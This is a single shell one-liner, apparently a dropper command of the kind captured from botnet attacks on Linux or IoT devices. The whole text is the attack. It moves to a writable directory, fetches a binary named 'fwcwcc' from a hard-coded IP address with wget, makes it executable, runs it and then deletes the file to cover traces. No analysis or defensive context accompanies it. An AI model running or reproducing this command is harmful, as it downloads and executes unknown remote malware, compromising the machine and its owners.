cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget http://91.219.31.17/fwcwcc; wget http://91.219.31.17/fwcwcc; chmod +x fwcwcc; ./fwcwcc; rm -rf fwcwcc
